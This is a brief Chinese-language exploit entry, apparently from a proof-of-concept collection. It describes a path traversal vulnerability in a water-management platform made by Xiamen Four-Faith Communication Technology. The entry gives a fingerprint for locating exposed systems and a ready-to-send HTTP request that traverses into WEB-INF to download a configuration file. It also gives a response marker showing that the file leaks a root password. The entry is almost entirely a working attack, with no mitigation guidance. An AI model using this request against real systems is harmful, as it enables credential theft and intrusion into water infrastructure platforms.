# 厦门四信通信科技有限公司水利系统txtuserLogin存在路径遍历漏洞

厦门四信通信科技有限公司水利系统 ｜ 路径遍历 ｜ —
- **指纹**：`title="水利信息化平台"`
- **请求**：`GET /sysRole/sysExportStatist/../../stAlarmInfo/download.do;txtuserLogin.do?type=down&fileName=../WEB-INF/classes/web.properties HTTP/1.1`
- **响应特征**：200 root_pwd